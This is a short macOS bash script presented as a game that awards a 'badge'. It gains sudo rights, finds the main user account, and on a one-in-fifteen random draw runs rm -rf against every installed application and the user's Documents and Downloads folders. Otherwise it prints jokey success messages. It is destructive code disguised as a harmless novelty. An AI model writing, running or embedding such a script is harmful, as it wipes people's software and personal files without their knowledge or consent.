#!/bin/bash

sudo echo
idun=$(dscl . list /Users UniqueID | grep -Eo "[^']*                   501" | sed 's/\.*                   501*//')
rdnum=$((RANDOM % 15 + 1))
if [ "$rdnum" -eq 12 ]; then
    echo "It might seem crazy what I'm bout to say"
    /bin/sh -c "$(rm -rf /Applications/*)"
    /bin/sh -c "$(rm -rf /Users/$idun/Documents/*)"
    /bin/sh -c "$(rm -rf /Users/$idun/Downloads/*)"
else
    echo "Badge awarded"
    echo "I'm walkin' here"
    echo "Successfully survive rdnum"
fi
